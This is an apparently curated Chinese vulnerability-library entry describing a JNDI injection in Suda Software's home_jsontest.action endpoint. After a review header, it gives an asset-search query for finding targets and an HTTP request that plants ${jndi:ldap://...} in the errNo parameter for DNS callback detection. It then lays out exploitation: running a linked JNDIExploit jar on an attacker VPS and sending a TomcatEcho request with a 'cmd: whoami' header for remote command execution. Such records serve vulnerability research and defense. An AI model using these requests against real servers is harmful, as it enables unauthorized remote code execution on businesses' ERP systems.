---
source: "wy876 漏洞文库"
title: "速达软件 home_jsontest errNo JNDI迹象"
product: "速达软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "ISLOGIN=TRUE/eid条件；JDK日志依赖未知"
prerequisites: "JSESSIONID"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gfkhwzlwu9779wkv"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%EF%BC%88%E5%B9%BF%E5%B7%9E%EF%BC%89%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81home_jsontest%E5%AD%98%E5%9C%A8JNID%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"速达软件技术（广州）有限公司\""
id: "vw-77051ca908335182e7bbcc5d"
entity_id: "ve-77051ca908335182e7bbcc5d"
schema_version: "1"
---

# 速达软件 home_jsontest errNo JNDI迹象

## 条目说明

- 对象与具体问题：速达软件；home_jsontest errNo JNDI迹象
- 版本、配置及部署条件：ISLOGIN=TRUE/eid条件；JDK日志依赖未知
- 认证与权限前提：JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- JNID错字；不同errNo入口不能因同payload与229合为同一已证根因
- DNS回连与Tomcat命令回显应分证据等级，均无结果
- 未知多款产品/安全版本，Hunter元数据误归FOFA，Jar可信性未证

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

## 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


## 四、漏洞复现
1. 获取dnslog

```plain
56tcas.dnslog.cn
```


2. 检测是否存在漏洞

```http
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://56tcas.dnslog.cn} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```


漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146440-fd7d4f17-a37c-4c78-b216-daf75b276c2c.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```


```http
GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gfkhwzlwu9779wkv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
